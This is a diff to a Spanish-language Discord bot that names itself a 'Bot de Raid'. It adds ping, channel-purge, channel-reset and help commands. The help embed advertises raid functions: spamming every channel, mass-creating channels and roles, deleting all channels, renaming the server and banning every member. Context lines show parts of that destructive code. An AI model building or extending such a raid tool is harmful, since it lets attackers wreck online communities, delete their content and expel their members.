@@ -1,7 +1,6 @@
 import discord
 from discord.ext import commands
 import asyncio
-import os
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -128,6 +127,17 @@ async def cr(ctx, cantidad: int, *, nombre_base: str):
     await ctx.send(f"Listo, se han creado `{creados}` roles con nombre base `{nombre_base}`.")
 
 @bot.command()
+@commands.has_permissions(administrator=True)
+async def ping(ctx):
+    try:
+        latencia = round(bot.latency * 1000)
+        await ctx.send(f"🏓 Pong! Ping del bot: `{latencia}ms`")
+    except discord.Forbidden:
+        await ctx.send("No tengo permisos para enviar mensajes aquí.")
+    except Exception as e:
+        await ctx.send(f"Error al ejecutar el comando: {e}")
+
+@bot.command()
 @commands.has_permissions(manage_channels=True)
 async def ret(ctx, cantidad: int, nombre_base: str, *, mensaje: str):
     if cantidad > 500:
@@ -176,9 +186,78 @@ async def bn(ctx):
 
     await ctx.send(f"Listo, se han baneado `{baneados}` Personas.")
 
+@bot.command()
+@commands.has_permissions(administrator=True)
+async def clear(ctx):
+    try:
+        await ctx.send("Borrando todos los mensajes del canal...")
+        await ctx.channel.purge(limit=None)
+        confirmacion = await ctx.send("Todos los mensajes han sido borrados.")
+        await asyncio.sleep(5)
+        await confirmacion.delete()
+    except discord.Forbidden:
+        await ctx.send("No tengo permisos para borrar mensajes.")
+    except Exception as e:
+        await ctx.send(f"Error al borrar mensajes: {e}")
+
+@bot.command()
+@commands.has_permissions(manage_channels=True)
+async def resetcanal(ctx):
+    canal = ctx.channel
+    nombre = canal.name
+    categoria = canal.category
+
+    await ctx.send(f"Este comando eliminará el canal `{nombre}` y lo recreará vacío.\nEscribe `y` para continuar.")
+
+    def check(m):
+        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "y"
+
+    try:
+        await bot.wait_for("message", check=check, timeout=15)
+    except asyncio.TimeoutError:
+        await ctx.send("Tiempo agotado. Cancelado.")
+        return
+
+    try:
+        nuevo = await canal.clone()
+        await canal.delete()
+        await nuevo.edit(name=nombre, category=categoria)
+        await nuevo.send(f"Canal `{nombre}` ha sido reiniciado.")
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
+
+@bot.command(name="hlp")
+async def hlp(ctx):
+    embed = discord.Embed(
+        title="Comandos de Chuyibot",
+        description="Aquí están los comandos disponibles:",
+        color=discord.Color.blue()
+    )
+
+    embed.add_field(
+        name="Canal",
+        value="`$clearall` – Borra todos los mensajes de un solo canal\n`$resetcanal` – resetea un canal borrando todos los mensajes enviados en el pero conservando la configuración de roles y el nombre de el canal.",
+        inline=False
+    )
+
+    embed.add_field(
+        name="ℹ️ Raid Info",
+        value="`$spam <cantidad> <mensaje>` – Hace spam en todos los canales.\n`$raid <Cantidad de canales a crear> <Nombre de los canales>` – Crea una cantidad personalizada de canales.\n`$nuke` – Borra todos los canales del servidor.\n`$cn <Nuevo nombre del servidor>` – Crea un nuevo nombre al servidor.\n`$cr <cantidad> <nombre de los roles>` – Crea una cantidad de roles en el servidor.\n`$ci <Adjunta una imagen>` – Crea una nueva foto para el servidor.\n`$ret <Cantidad> <Nombre de canales a crear> <Mensaje de Spam>` – Raidea el servidor creando una cantidad absurda de canales con un nombre y mensaje de spam personalizado.\n`$bn` – Banea a todos los miembros del servidor excepto a los bots con administrador.",
+        inline=False
+    )
+
+    embed.add_field(
+        name="ℹ️ Ayuda",
+        value="`$hlp` – Muestra este panel de ayuda de comandos\n`$ping` – Mostrar la latencia del bot\n - ***Recuerda que el bot debe ser activado por su creador***.",
+        inline=False
+    )
+
+    embed.set_footer(text="Bot de Raid • ChuyiBot")
+    await ctx.send(embed=embed)
+
 @bot.event
 async def on_ready():
     print(f'Bot conectado como {bot.user}')
 
-
 bot.run("TU TOKEN AQUI")
+
